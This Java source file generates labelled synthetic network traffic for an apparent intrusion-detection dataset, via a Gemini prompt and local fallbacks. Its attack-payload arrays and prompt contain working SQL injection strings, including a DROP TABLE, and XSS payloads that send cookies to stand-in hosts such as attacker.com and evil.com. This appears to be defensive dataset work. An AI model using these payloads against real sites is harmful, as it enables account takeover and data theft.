package AI;

import org.json.*;
import java.io.*;
import java.net.*;
import java.util.*;
import Components.Node;
import Components.Link;

public class GeminiPacketGenerator {

    private static final String API_KEY = loadApiKey();
    private static final String API_URL = "https://generativelanguage.googleapis.com/v1beta/models/gemini-2.5-flash:generateContent";

    private static String loadApiKey() {
        Properties props = new Properties();
        String configPath = "config.properties";

        try (InputStream input = new FileInputStream(configPath)) {
            props.load(input);
            String apiKey = props.getProperty("gemini.api.key");

            if (apiKey == null || apiKey.trim().isEmpty() || apiKey.equals("YOUR_GEMINI_API_KEY_HERE")) {
                throw new RuntimeException(
                        "⚠️ Gemini API key not found!\n" +
                                "Please:\n" +
                                "1. Copy 'config.properties.template' to 'config.properties'\n" +
                                "2. Add your Gemini API key from https://makersuite.google.com/app/apikey\n" +
                                "3. Replace 'YOUR_GEMINI_API_KEY_HERE' with your actual key");
            }

            return apiKey.trim();
        } catch (FileNotFoundException e) {
            throw new RuntimeException(
                    "⚠️ Configuration file not found!\n" +
                            "Please:\n" +
                            "1. Copy 'config.properties.template' to 'config.properties'\n" +
                            "2. Add your Gemini API key from https://makersuite.google.com/app/apikey",
                    e);
        } catch (IOException e) {
            throw new RuntimeException("Error reading configuration file: " + e.getMessage(), e);
        }
    }

    public static class NetworkPacket {

        public String packetId;
        public double timestamp;
        public int sequenceNumber;

        public String sourceIP;
        public String destIP;
        public int sourcePort;
        public int destPort;
        public String protocol;

        public int packetSize;
        public int ttl;
        public int headerLength;
        public String flags;
        public String applicationType;
        public String payload;
        public int payloadSize;

        public String trafficType;
        public String attackType;
        public double latency;
        public double jitter;
        public int retransmissions;

        public int connectionDuration;
        public int bytesSent;
        public int bytesReceived;
        public double packetRate;
        public String serviceType;

        public int sameHostConnections;
        public int sameSrcPortConnections;
        public double errorRate;
        public boolean isFragmented;

        public NetworkPacket() {
            this.timestamp = System.currentTimeMillis() / 1000.0;
        }

        @Override
        public String toString() {
            return String.format("Packet[%s]: %s:%d → %s:%d (%s/%s) [%d bytes] Type:%s",
                    packetId, sourceIP, sourcePort, destIP, destPort,
                    protocol, applicationType, packetSize, trafficType);
        }

        public String toCSV() {
            return String.format(
                    "%s,%.3f,%d,%s,%s,%d,%d,%s,%d,%d,%d,%s,%s,\"%s\",%d,%s,%s,%.3f,%.3f,%d,%d,%d,%d,%.3f,%s,%d,%d,%.3f,%b",
                    packetId, timestamp, sequenceNumber,
                    sourceIP, destIP, sourcePort, destPort,
                    protocol, packetSize, ttl, headerLength, flags,
                    applicationType,
                    payload != null ? payload.replace("\"", "\"\"").substring(0, Math.min(500, payload.length())) : "",
                    payloadSize, trafficType, attackType != null ? attackType : "null",
                    latency, jitter, retransmissions,
                    connectionDuration, bytesSent, bytesReceived, packetRate,
                    serviceType, sameHostConnections, sameSrcPortConnections,
                    errorRate, isFragmented);
        }

        public static String getCSVHeader() {
            return "PacketID,Timestamp,SequenceNum,SourceIP,DestIP,SourcePort,DestPort," +
                    "Protocol,PacketSize,TTL,HeaderLength,Flags,ApplicationType,Payload," +
                    "PayloadSize,TrafficType,AttackType,Latency,Jitter,Retransmissions," +
                    "ConnectionDuration,BytesSent,BytesReceived,PacketRate,ServiceType," +
                    "SameHostConnections,SameSrcPortConnections,ErrorRate,IsFragmented";
        }
    }

    public static List<NetworkPacket> generatePackets(int count, String scenario) throws IOException {
        String prompt = buildPrompt(count, scenario);
        String response = callGeminiAPI(prompt);
        return parsePacketsFromResponse(response, count);
    }

    public static List<NetworkPacket> generatePacketsFromTopology(
            Collection<Node> nodes,
            Collection<Link> links,
            int count,
            String scenario,
            UI.SimulationConfigDialog.SimulationConfig simConfig) {

        if (nodes.isEmpty()) {
            return generateFallbackPackets(count);
        }

        List<NetworkPacket> packets = new ArrayList<>();
        List<Node> nodeList = new ArrayList<>(nodes);
        List<Link> linkList = new ArrayList<>(links);
        Random random = new Random();

        Map<Long, String> nodeToIP = new HashMap<>();
        for (Node node : nodeList) {
            nodeToIP.put(node.id, generateNodeIP(node.id));
        }

        double attackProbability = getAttackProbability(scenario);
        String[] attackTypes = getAttackTypes(scenario);

        double simDuration = simConfig != null ? simConfig.simTime : 100.0;

        for (int i = 0; i < count; i++) {
            NetworkPacket packet = new NetworkPacket();
            packet.packetId = "PKT-" + String.format("%06d", i + 1);
            packet.sequenceNumber = i + 1;
            packet.timestamp = System.currentTimeMillis() / 1000.0 + (i * (simDuration / count));

            Node srcNode, dstNode;

            if (!linkList.isEmpty() && random.nextDouble() < 0.7) {
                Link link = linkList.get(random.nextInt(linkList.size()));
                srcNode = link.node1;
                dstNode = link.node2;
                if (random.nextBoolean()) {
                    Node temp = srcNode;
                    srcNode = dstNode;
                    dstNode = temp;
                }
            } else {
                srcNode = nodeList.get(random.nextInt(nodeList.size()));
                do {
                    dstNode = nodeList.get(random.nextInt(nodeList.size()));
                } while (dstNode == srcNode && nodeList.size() > 1);
            }

            packet.sourceIP = nodeToIP.get(srcNode.id);
            packet.destIP = nodeToIP.get(dstNode.id);

            boolean isAttack = random.nextDouble() < attackProbability;
            packet.trafficType = isAttack ? "Attack" : "Normal";
            packet.attackType = isAttack ? attackTypes[random.nextInt(attackTypes.length)] : null;

            generatePacketDetails(packet, isAttack, random);

            packets.add(packet);
        }

        return packets;
    }

    private static String generateNodeIP(long nodeId) {
        int subnet = (int) ((nodeId / 254) + 1);
        int host = (int) ((nodeId % 254) + 1);
        return "192.168." + subnet + "." + host;
    }

    private static double getAttackProbability(String scenario) {
        return switch (scenario.toLowerCase()) {
            case "normal traffic" -> 0.05;
            case "ddos attack" -> 0.8;
            case "port scan" -> 0.7;
            case "mixed traffic" -> 0.4;
            case "web attack" -> 0.6;
            case "malware communication" -> 0.5;
            default -> 0.3;
        };
    }

    private static String[] getAttackTypes(String scenario) {
        return switch (scenario.toLowerCase()) {
            case "ddos attack" -> new String[] { "DDoS", "DoS" };
            case "port scan" -> new String[] { "PortScan", "Probe" };
            case "web attack" -> new String[] { "SQLInjection", "XSS", "BruteForce" };
            case "malware communication" -> new String[] { "Malware", "Botnet" };
            default -> new String[] { "DoS", "DDoS", "PortScan", "BruteForce", "SQLInjection", "XSS", "Malware" };
        };
    }

    private static void generatePacketDetails(NetworkPacket packet, boolean isAttack, Random random) {
        String[] normalProtocols = { "TCP", "TCP", "TCP", "UDP", "UDP" };
        String[] attackProtocols = { "TCP", "UDP", "ICMP" };
        packet.protocol = isAttack ? attackProtocols[random.nextInt(attackProtocols.length)]
                : normalProtocols[random.nextInt(normalProtocols.length)];

        if (packet.protocol.equals("TCP")) {
            String[] apps = { "HTTP", "HTTPS", "SSH", "FTP", "Telnet" };
            int[] ports = { 80, 443, 22, 21, 23 };
            int appIdx = random.nextInt(apps.length);
            packet.applicationType = apps[appIdx];
            packet.destPort = ports[appIdx];
            packet.sourcePort = 1024 + random.nextInt(60000);
            packet.flags = isAttack ? new String[] { "SYN", "SYN", "RST", "FIN" }[random.nextInt(4)]
                    : new String[] { "ACK", "PSH-ACK", "SYN-ACK" }[random.nextInt(3)];
        } else if (packet.protocol.equals("UDP")) {
            String[] apps = { "DNS", "DHCP", "Custom" };
            int[] ports = { 53, 67, 8080 };
            int appIdx = random.nextInt(apps.length);
            packet.applicationType = apps[appIdx];
            packet.destPort = ports[appIdx];
            packet.sourcePort = 1024 + random.nextInt(60000);
            packet.flags = "";
        } else {
            packet.applicationType = "ICMP";
            packet.destPort = 0;
            packet.sourcePort = 0;
            packet.flags = "";
        }

        if (isAttack) {
            packet.packetSize = random.nextBoolean() ? 64 + random.nextInt(100) : // Small (probe)
                    1200 + random.nextInt(300);
        } else {
            packet.packetSize = 200 + random.nextInt(800);
        }

        packet.ttl = 32 + random.nextInt(96);
        packet.headerLength = packet.protocol.equals("TCP") ? 20 + random.nextInt(40) : 20;
        packet.payloadSize = Math.max(0, packet.packetSize - packet.headerLength);

        if (isAttack && packet.attackType != null) {
            packet.payload = generateAttackPayload(packet.attackType, packet.applicationType, packet.payloadSize);
        } else {
            packet.payload = generatePayload(packet.applicationType, packet.payloadSize);
        }

        if (isAttack) {
            packet.latency = 0.05 + random.nextDouble() * 0.2;
            packet.jitter = 0.01 + random.nextDouble() * 0.04;
            packet.retransmissions = random.nextInt(5);
            packet.packetRate = 100 + random.nextInt(900);
            packet.errorRate = 0.05 + random.nextDouble() * 0.05;
        } else {
            packet.latency = 0.001 + random.nextDouble() * 0.05;
            packet.jitter = random.nextDouble() * 0.01;
            packet.retransmissions = random.nextInt(2);
            packet.packetRate = 1 + random.nextInt(100);
            packet.errorRate = random.nextDouble() * 0.02;
        }

        packet.connectionDuration = 1 + random.nextInt(isAttack ? 30 : 100);
        packet.bytesSent = 100 + random.nextInt(100000);
        packet.bytesReceived = 100 + random.nextInt(100000);
        packet.serviceType = packet.applicationType.toLowerCase();
        packet.sameHostConnections = random.nextInt(isAttack ? 100 : 30);
        packet.sameSrcPortConnections = random.nextInt(isAttack ? 50 : 15);
        packet.isFragmented = packet.packetSize > 1000 && random.nextBoolean();
    }

    private static String buildPrompt(int count, String scenario) {
        return String.format(
                """
                        Generate %d realistic network packets for a %s scenario.

                        Return ONLY a JSON array with this EXACT structure (no markdown, no explanation):
                        [
                          {
                            "sourceIP": "192.168.1.x",
                            "destIP": "10.0.0.x",
                            "sourcePort": 1024-65535,
                            "destPort": 80|443|22|21|25|53,
                            "protocol": "TCP|UDP|ICMP",
                            "packetSize": 64-1500,
                            "ttl": 32-128,
                            "headerLength": 20-60,
                            "flags": "SYN|ACK|PSH|FIN|RST combination",
                            "applicationType": "HTTP|HTTPS|SSH|FTP|DNS|SMTP|Telnet",
                            "payload": "REALISTIC packet payload content here",
                            "payloadSize": 0-1460,
                            "trafficType": "Normal|Attack|Anomaly",
                            "attackType": "null|DoS|DDoS|PortScan|BruteForce|SQLInjection|XSS|Malware",
                            "latency": 0.001-0.5 seconds,
                            "jitter": 0.0001-0.05 seconds,
                            "retransmissions": 0-5,
                            "connectionDuration": 1-300 seconds,
                            "bytesSent": 100-1000000,
                            "bytesReceived": 100-1000000,
                            "packetRate": 1-1000 packets/sec,
                            "serviceType": "http|ftp|smtp|ssh|dns|telnet|custom",
                            "sameHostConnections": 0-100,
                            "sameSrcPortConnections": 0-50,
                            "errorRate": 0.0-0.1,
                            "isFragmented": true|false
                          }
                        ]

                        CRITICAL RULES:
                        1. Generate diverse, realistic IP addresses (mix of private/public ranges)
                        2. Match ports to protocols (80/443 for HTTP, 22 for SSH, 21 for FTP, etc.)
                        3. For %s scenario, include appropriate attack patterns if applicable
                        4. Packet sizes must be realistic (64-1500 bytes, average ~500-800)
                        5. TCP flags must be valid combinations (SYN, SYN-ACK, ACK, PSH-ACK, FIN-ACK, RST)
                        6. Attack packets should have distinctive patterns (high packet rate, port scanning ranges, etc.)
                        7. Normal traffic should follow typical application behaviors
                        8. Include time-based patterns (burst traffic, periodic connections)
                        9. Payload sizes correlate with application types
                        10. Return PURE JSON - no backticks, no markdown formatting

                        PAYLOAD GENERATION RULES:
                        For ATTACK packets, generate REALISTIC malicious payloads:
                        - SQLInjection: Actual SQL injection strings like "admin' OR '1'='1' --", "UNION SELECT password FROM users--"
                        - XSS: Real XSS payloads like "<script>document.location='http://attacker.com/steal.php?cookie='+document.cookie</script>"
                        - DoS/DDoS: HTTP flood patterns "GET / HTTP/1.1\\r\\nHost: target.com\\r\\nConnection: keep-alive", SYN floods
                        - PortScan: "SYN [Port=8080 SEQ=12345 Flags=S] [NMAP Probe]", "NULL Scan [Port=22 Flags=0x00]"
                        - BruteForce: Login attempts "POST /admin/login ... username=admin&password=attempt1234"
                        - Malware: C2 communication "POST /beacon HTTP/1.1\\r\\nHost: c2-server.com\\r\\n{\\"bot_id\\":\\"abc123\\"}"

                        For NORMAL packets, generate REALISTIC legitimate payloads:
                        - HTTP/HTTPS: "GET /index.html HTTP/1.1\\r\\nHost: www.example.com\\r\\nUser-Agent: Mozilla/5.0"
                        - SSH: "SSH-2.0-OpenSSH_8.2p1 Ubuntu-4ubuntu0.5\\r\\n"
                        - DNS: "DNS Query [ID: 12345] [Type: A] [Name: google.com] [Class: IN]"
                        - FTP: "220 FTP Server Ready (vsFTPd 3.0.3)\\r\\n"
                        - SMTP: "220 mail.example.com ESMTP Postfix\\r\\n"

                        Scenario details for '%s':
                        - Normal: 80%% legitimate traffic, 20%% noise
                        - DDoS Attack: High volume from multiple sources to single target
                        - Port Scan: Sequential port probing, low packet sizes
                        - Mixed: 60%% normal, 40%% various attack types
                        - Web Attack: SQL injection, XSS attempts in HTTP traffic
                        - Malware: C&C communication, beaconing patterns
                        """,
                count, scenario, scenario, scenario);
    }

    private static String callGeminiAPI(String prompt) throws IOException {
        URL url = new URL(API_URL + "?key=" + API_KEY);

        for (int retry = 0; retry < 3; retry++) {
            try {
                HttpURLConnection conn = (HttpURLConnection) url.openConnection();
                conn.setRequestMethod("POST");
                conn.setRequestProperty("Content-Type", "application/json");
                conn.setDoOutput(true);

                JSONObject requestBody = new JSONObject();
                JSONArray contents = new JSONArray();
                JSONObject content = new JSONObject();
                JSONArray parts = new JSONArray();
                JSONObject part = new JSONObject();
                part.put("text", prompt);
                parts.put(part);
                content.put("parts", parts);
                contents.put(content);
                requestBody.put("contents", contents);

                JSONObject generationConfig = new JSONObject();
                generationConfig.put("temperature", 0.7);
                generationConfig.put("topK", 40);
                generationConfig.put("topP", 0.95);
                generationConfig.put("maxOutputTokens", 8192);
                requestBody.put("generationConfig", generationConfig);

                try (OutputStream os = conn.getOutputStream()) {
                    byte[] input = requestBody.toString().getBytes("utf-8");
                    os.write(input, 0, input.length);
                }

                int responseCode = conn.getResponseCode();
                if (responseCode == 200) {
                    try (BufferedReader br = new BufferedReader(
                            new InputStreamReader(conn.getInputStream(), "utf-8"))) {
                        StringBuilder response = new StringBuilder();
                        String responseLine;
                        while ((responseLine = br.readLine()) != null) {
                            response.append(responseLine.trim());
                        }
                        return extractTextFromResponse(response.toString());
                    }
                } else {
                    try (BufferedReader br = new BufferedReader(
                            new InputStreamReader(conn.getErrorStream(), "utf-8"))) {
                        StringBuilder error = new StringBuilder();
                        String line;
                        while ((line = br.readLine()) != null) {
                            error.append(line);
                        }
                        System.err.println("Gemini API Error: " + error.toString());
                    }
                }

                if (retry < 2) {
                    Thread.sleep(1000 * (retry + 1));
                }

            } catch (Exception e) {
                if (retry == 2) {
                    throw new IOException("Failed to call Gemini API after 3 retries", e);
                }
                try {
                    Thread.sleep(1000 * (retry + 1));
                } catch (InterruptedException ie) {
                    Thread.currentThread().interrupt();
                }
            }
        }

        throw new IOException("Failed to get response from Gemini API");
    }

    private static String extractTextFromResponse(String response) {
        try {
            JSONObject json = new JSONObject(response);
            JSONArray candidates = json.getJSONArray("candidates");
            JSONObject firstCandidate = candidates.getJSONObject(0);
            JSONObject content = firstCandidate.getJSONObject("content");
            JSONArray parts = content.getJSONArray("parts");
            JSONObject firstPart = parts.getJSONObject(0);
            return firstPart.getString("text");
        } catch (Exception e) {
            System.err.println("Failed to parse Gemini response: " + e.getMessage());
            return response;
        }
    }

    private static List<NetworkPacket> parsePacketsFromResponse(String response, int expectedCount) {
        List<NetworkPacket> packets = new ArrayList<>();

        try {
            String cleaned = response.trim();
            if (cleaned.startsWith("```json")) {
                cleaned = cleaned.substring(7);
            }
            if (cleaned.startsWith("```")) {
                cleaned = cleaned.substring(3);
            }
            if (cleaned.endsWith("```")) {
                cleaned = cleaned.substring(0, cleaned.length() - 3);
            }
            cleaned = cleaned.trim();

            JSONArray jsonArray = new JSONArray(cleaned);

            for (int i = 0; i < jsonArray.length(); i++) {
                JSONObject obj = jsonArray.getJSONObject(i);
                NetworkPacket packet = new NetworkPacket();

                packet.packetId = "PKT-" + String.format("%06d", i + 1);
                packet.sequenceNumber = i + 1;
                packet.timestamp += i * 0.001;

                packet.sourceIP = obj.optString("sourceIP", generateRandomIP());
                packet.destIP = obj.optString("destIP", generateRandomIP());
                packet.sourcePort = obj.optInt("sourcePort", 1024 + (int) (Math.random() * 60000));
                packet.destPort = obj.optInt("destPort", 80);
                packet.protocol = obj.optString("protocol", "TCP");

                packet.packetSize = obj.optInt("packetSize", 512);
                packet.ttl = obj.optInt("ttl", 64);
                packet.headerLength = obj.optInt("headerLength", 20);
                packet.flags = obj.optString("flags", "ACK");

                packet.applicationType = obj.optString("applicationType", "HTTP");
                packet.payloadSize = obj.optInt("payloadSize", 256);

                // Try to get payload from Gemini response first, fallback to local generation
                String geminiPayload = obj.optString("payload", null);
                if (geminiPayload != null && !geminiPayload.isEmpty()
                        && !geminiPayload.equals("REALISTIC packet payload content here")) {
                    packet.payload = geminiPayload;
                } else {
                    // Fallback: check if attack and generate accordingly
                    String attackTypeStr = obj.optString("attackType", "null");
                    boolean isAttack = !attackTypeStr.equals("null") && attackTypeStr != null;
                    if (isAttack) {
                        packet.payload = generateAttackPayload(attackTypeStr, packet.applicationType,
                                packet.payloadSize);
                    } else {
                        packet.payload = generatePayload(packet.applicationType, packet.payloadSize);
                    }
                }

                packet.trafficType = obj.optString("trafficType", "Normal");
                String attackTypeStr = obj.optString("attackType", "null");
                packet.attackType = attackTypeStr.equals("null") ? null : attackTypeStr;
                packet.latency = obj.optDouble("latency", 0.01 + Math.random() * 0.05);
                packet.jitter = obj.optDouble("jitter", Math.random() * 0.01);
                packet.retransmissions = obj.optInt("retransmissions", 0);

                packet.connectionDuration = obj.optInt("connectionDuration", 10 + (int) (Math.random() * 50));
                packet.bytesSent = obj.optInt("bytesSent", 1000 + (int) (Math.random() * 50000));
                packet.bytesReceived = obj.optInt("bytesReceived", 1000 + (int) (Math.random() * 50000));
                packet.packetRate = obj.optDouble("packetRate", 10 + Math.random() * 90);
                packet.serviceType = obj.optString("serviceType", "http");

                packet.sameHostConnections = obj.optInt("sameHostConnections", (int) (Math.random() * 20));
                packet.sameSrcPortConnections = obj.optInt("sameSrcPortConnections", (int) (Math.random() * 10));
                packet.errorRate = obj.optDouble("errorRate", Math.random() * 0.05);
                packet.isFragmented = obj.optBoolean("isFragmented", false);

                packets.add(packet);
            }

        } catch (Exception e) {
            System.err.println("Failed to parse Gemini JSON response: " + e.getMessage());
            System.err.println("Response was: " + response);

            return generateFallbackPackets(expectedCount);
        }

        if (packets.size() < expectedCount) {
            System.out.println("Got " + packets.size() + " packets from AI, generating " +
                    (expectedCount - packets.size()) + " more...");
            packets.addAll(generateFallbackPackets(expectedCount - packets.size()));
        }

        return packets;
    }

    private static List<NetworkPacket> generateFallbackPackets(int count) {
        List<NetworkPacket> packets = new ArrayList<>();
        String[] protocols = { "TCP", "UDP", "ICMP" };
        String[] appTypes = { "HTTP", "HTTPS", "SSH", "FTP", "DNS", "SMTP" };
        String[] trafficTypes = { "Normal", "Normal", "Normal", "Attack", "Anomaly" };
        String[] attackTypes = { null, null, null, "DoS", "PortScan", "BruteForce" };

        for (int i = 0; i < count; i++) {
            NetworkPacket packet = new NetworkPacket();
            packet.packetId = "PKT-" + String.format("%06d", i + 1);
            packet.sequenceNumber = i + 1;
            packet.timestamp += i * 0.001;

            packet.sourceIP = generateRandomIP();
            packet.destIP = generateRandomIP();
            packet.sourcePort = 1024 + (int) (Math.random() * 60000);
            packet.destPort = new int[] { 80, 443, 22, 21, 25, 53 }[(int) (Math.random() * 6)];
            packet.protocol = protocols[(int) (Math.random() * protocols.length)];

            packet.packetSize = 64 + (int) (Math.random() * 1400);
            packet.ttl = 32 + (int) (Math.random() * 96);
            packet.headerLength = 20 + (int) (Math.random() * 40);
            packet.flags = packet.protocol.equals("TCP")
                    ? new String[] { "SYN", "ACK", "PSH-ACK", "FIN-ACK" }[(int) (Math.random() * 4)]
                    : "";

            packet.applicationType = appTypes[(int) (Math.random() * appTypes.length)];
            packet.payloadSize = (int) (Math.random() * 1000);
            packet.payload = generatePayload(packet.applicationType, packet.payloadSize);

            int trafficIdx = (int) (Math.random() * trafficTypes.length);
            packet.trafficType = trafficTypes[trafficIdx];
            packet.attackType = attackTypes[trafficIdx];

            packet.latency = 0.001 + Math.random() * 0.1;
            packet.jitter = Math.random() * 0.01;
            packet.retransmissions = (int) (Math.random() * 3);

            packet.connectionDuration = 1 + (int) (Math.random() * 100);
            packet.bytesSent = 100 + (int) (Math.random() * 100000);
            packet.bytesReceived = 100 + (int) (Math.random() * 100000);
            packet.packetRate = 1 + Math.random() * 100;
            packet.serviceType = packet.applicationType.toLowerCase();

            packet.sameHostConnections = (int) (Math.random() * 30);
            packet.sameSrcPortConnections = (int) (Math.random() * 15);
            packet.errorRate = Math.random() * 0.05;
            packet.isFragmented = Math.random() < 0.1;

            packets.add(packet);
        }

        return packets;
    }

    private static String generateRandomIP() {
        int type = (int) (Math.random() * 3);
        switch (type) {
            case 0:
                return "10." + (int) (Math.random() * 256) + "." +
                        (int) (Math.random() * 256) + "." + (int) (Math.random() * 256);
            case 1:
                return "172." + (16 + (int) (Math.random() * 16)) + "." +
                        (int) (Math.random() * 256) + "." + (int) (Math.random() * 256);
            default:
                return "192.168." + (int) (Math.random() * 256) + "." + (int) (Math.random() * 256);
        }
    }

    private static String generatePayload(String appType, int size) {
        String base = "";

        switch (appType.toUpperCase()) {
            case "HTTP":
            case "HTTPS":
                String[] httpPayloads = {
                        "GET /index.html HTTP/1.1\r\nHost: www.example.com\r\nUser-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64)\r\nAccept: text/html,application/xhtml+xml\r\nConnection: keep-alive\r\n\r\n",
                        "POST /api/users HTTP/1.1\r\nHost: api.example.com\r\nContent-Type: application/json\r\nAuthorization: Bearer eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9\r\n\r\n{\"name\":\"John\",\"email\":\"john@example.com\"}",
                        "HTTP/1.1 200 OK\r\nContent-Type: application/json\r\nContent-Length: 256\r\nCache-Control: max-age=3600\r\n\r\n{\"status\":\"success\",\"data\":{\"id\":123,\"value\":\"response\"}}",
                        "GET /images/logo.png HTTP/1.1\r\nHost: cdn.example.com\r\nAccept: image/png,image/webp\r\nReferer: https://www.example.com/\r\n\r\n",
                        "POST /checkout HTTP/1.1\r\nHost: shop.example.com\r\nContent-Type: application/x-www-form-urlencoded\r\n\r\nitem_id=12345&quantity=2&user_id=789",
                        "GET /search?q=network+security&page=1 HTTP/1.1\r\nHost: www.example.com\r\nAccept-Language: en-US,en;q=0.9\r\n\r\n"
                };
                base = httpPayloads[(int) (Math.random() * httpPayloads.length)];
                break;

            case "SSH":
                String[] sshPayloads = {
                        "SSH-2.0-OpenSSH_8.2p1 Ubuntu-4ubuntu0.5\r\n",
                        "SSH Key Exchange Init [KEX_ALGORITHMS: diffie-hellman-group-exchange-sha256,ecdh-sha2-nistp256]\r\n[HOST_KEY: ssh-rsa,ssh-ed25519]\r\n[ENCRYPTION: aes128-ctr,aes256-ctr,chacha20-poly1305]\r\n",
                        "SSH Authentication Request [Method: publickey] [User: developer] [Key: RSA-2048]\r\n",
                        "SSH Channel Open [Type: session] [Sender Channel: 0] [Window: 65536] [Max Packet: 32768]\r\n",
                        "SSH Channel Request [Type: exec] [Command: ls -la /home/user/projects]\r\n",
                        "SSH Channel Data [Session: 1] [Data: total 48K drwxr-xr-x 12 user user 4.0K...]\r\n"
                };
                base = sshPayloads[(int) (Math.random() * sshPayloads.length)];
                break;

            case "DNS":
                String[] domains = { "google.com", "github.com", "stackoverflow.com", "example.com", "wikipedia.org",
                        "amazon.com" };
                String domain = domains[(int) (Math.random() * domains.length)];
                String[] dnsPayloads = {
                        "DNS Query [ID: " + (int) (Math.random() * 65535) + "] [Type: A] [Name: " + domain
                                + "] [Class: IN]\r\n",
                        "DNS Response [ID: " + (int) (Math.random() * 65535) + "] [Type: A] [Name: " + domain
                                + "] [Answer: " + (1 + (int) (Math.random() * 254)) + "." + (int) (Math.random() * 255)
                                + "." + (int) (Math.random() * 255) + "." + (int) (Math.random() * 255)
                                + "] [TTL: 300]\r\n",
                        "DNS Query [ID: " + (int) (Math.random() * 65535) + "] [Type: AAAA] [Name: " + domain
                                + "] [Class: IN]\r\n",
                        "DNS Query [ID: " + (int) (Math.random() * 65535) + "] [Type: MX] [Name: " + domain
                                + "] [Class: IN]\r\n",
                        "DNS Response [ID: " + (int) (Math.random() * 65535) + "] [Type: CNAME] [Name: www." + domain
                                + "] [Answer: cdn." + domain + "] [TTL: 3600]\r\n"
                };
                base = dnsPayloads[(int) (Math.random() * dnsPayloads.length)];
                break;

            case "FTP":
                String[] ftpPayloads = {
                        "220 FTP Server Ready (vsFTPd 3.0.3)\r\n",
                        "USER johndoe\r\n331 Please specify the password.\r\n",
                        "PASS ********\r\n230 Login successful.\r\n",
                        "LIST\r\n150 Here comes the directory listing.\r\n-rw-r--r-- 1 user group 2048 Oct 30 10:30 document.pdf\r\n226 Directory send OK.\r\n",
                        "RETR /files/report.pdf\r\n150 Opening BINARY mode data connection for report.pdf (524288 bytes).\r\n",
                        "STOR /uploads/backup.zip\r\n150 Ok to send data.\r\n226 Transfer complete.\r\n"
                };
                base = ftpPayloads[(int) (Math.random() * ftpPayloads.length)];
                break;

            case "SMTP":
                String[] smtpPayloads = {
                        "220 mail.example.com ESMTP Postfix\r\n",
                        "EHLO client.example.com\r\n250-mail.example.com\r\n250-PIPELINING\r\n250-SIZE 10240000\r\n250-STARTTLS\r\n250 HELP\r\n",
                        "MAIL FROM:<sender@example.com>\r\n250 2.1.0 Ok\r\n",
                        "RCPT TO:<recipient@example.com>\r\n250 2.1.5 Ok\r\n",
                        "DATA\r\n354 End data with <CR><LF>.<CR><LF>\r\nFrom: sender@example.com\r\nTo: recipient@example.com\r\nSubject: Meeting Tomorrow\r\n\r\nHi, just confirming our meeting at 2 PM.\r\n.\r\n250 2.0.0 Ok: queued as A1B2C3D4\r\n",
                        "QUIT\r\n221 2.0.0 Bye\r\n"
                };
                base = smtpPayloads[(int) (Math.random() * smtpPayloads.length)];
                break;

            case "TELNET":
                String[] telnetPayloads = {
                        "Trying 192.168.1.1...\r\nConnected to router.local.\r\nEscape character is '^]'.\r\n\r\nRouter Login: admin\r\nPassword: \r\nWelcome to RouterOS\r\n",
                        "show interfaces\r\neth0: <BROADCAST,MULTICAST,UP> mtu 1500\r\n    inet 192.168.1.1/24\r\n    RX packets:12458 bytes:8945123\r\n    TX packets:10234 bytes:6782341\r\n"
                };
                base = telnetPayloads[(int) (Math.random() * telnetPayloads.length)];
                break;

            case "NTP":
                String[] ntpPayloads = {
                        "NTP Request [Version: 4] [Mode: Client] [Stratum: 3] [Poll: 6] [Precision: -20]\r\n",
                        "NTP Response [Version: 4] [Mode: Server] [Stratum: 2] [Reference ID: GPS] [Reference Timestamp: "
                                + System.currentTimeMillis() + "]\r\n"
                };
                base = ntpPayloads[(int) (Math.random() * ntpPayloads.length)];
                break;

            case "DHCP":
                String[] dhcpPayloads = {
                        "DHCP Discover [Transaction ID: 0x" + Integer.toHexString((int) (Math.random() * 0xFFFFFF))
                                + "] [Client MAC: 00:1A:2B:3C:4D:5E]\r\n",
                        "DHCP Offer [Your IP: 192.168.1." + (100 + (int) (Math.random() * 150))
                                + "] [Server IP: 192.168.1.1] [Lease Time: 86400s]\r\n",
                        "DHCP Request [Requested IP: 192.168.1." + (100 + (int) (Math.random() * 150))
                                + "] [Client: 00:1A:2B:3C:4D:5E]\r\n",
                        "DHCP ACK [Your IP: 192.168.1." + (100 + (int) (Math.random() * 150))
                                + "] [Subnet: 255.255.255.0] [Gateway: 192.168.1.1] [DNS: 8.8.8.8]\r\n"
                };
                base = dhcpPayloads[(int) (Math.random() * dhcpPayloads.length)];
                break;

            default:
                base = "Application Data [Protocol: " + appType + "] [Length: " + size + " bytes] [Payload: 0x"
                        + Long.toHexString(System.currentTimeMillis()) + "...]";
        }

        while (base.length() < size) {
            base += "[...]";
        }

        return base.substring(0, Math.min(base.length(), size));
    }

    private static String generateAttackPayload(String attackType, String appType, int size) {
        String payload = "";

        switch (attackType) {
            case "SQLInjection":
                String[] sqlPayloads = {
                        "POST /login.php HTTP/1.1\r\nHost: victim.com\r\nContent-Type: application/x-www-form-urlencoded\r\n\r\nusername=admin' OR '1'='1' --&password=anything",
                        "GET /products.php?id=1' UNION SELECT username,password,email FROM users WHERE '1'='1 HTTP/1.1\r\nHost: victim.com\r\n",
                        "POST /search HTTP/1.1\r\nHost: vulnerable-site.com\r\n\r\nq='; DROP TABLE users; SELECT * FROM products WHERE name LIKE '%",
                        "GET /user.php?id=5' AND 1=0 UNION ALL SELECT table_name,NULL,NULL FROM information_schema.tables-- HTTP/1.1\r\n",
                        "POST /api/login HTTP/1.1\r\nContent-Type: application/json\r\n\r\n{\"user\":\"admin' OR 1=1--\",\"pass\":\"x\"}",
                        "GET /page?id=-1' UNION SELECT 1,2,3,concat(username,0x3a,password),5 FROM admin-- HTTP/1.1\r\n"
                };
                payload = sqlPayloads[(int) (Math.random() * sqlPayloads.length)];
                break;

            case "XSS":
                String[] xssPayloads = {
                        "GET /comment?text=<script>document.location='http://attacker.com/steal.php?cookie='+document.cookie</script> HTTP/1.1\r\n",
                        "POST /forum/post HTTP/1.1\r\nContent-Type: application/x-www-form-urlencoded\r\n\r\nmessage=<img src=x onerror='fetch(\"http://evil.com?c=\"+document.cookie)'>",
                        "GET /search?q=<svg/onload=alert(String.fromCharCode(88,83,83))> HTTP/1.1\r\nHost: vulnerable.com\r\n",
                        "POST /profile/update HTTP/1.1\r\n\r\nbio=<iframe src=javascript:alert('XSS')></iframe>",
                        "GET /view?name=<script>new Image().src=\"http://attacker.com/log.php?c=\"+document.cookie;</script> HTTP/1.1\r\n",
                        "POST /comment HTTP/1.1\r\n\r\ntext=<body onload=javascript:document.location='http://evil.com/phish.html'>"
                };
                payload = xssPayloads[(int) (Math.random() * xssPayloads.length)];
                break;

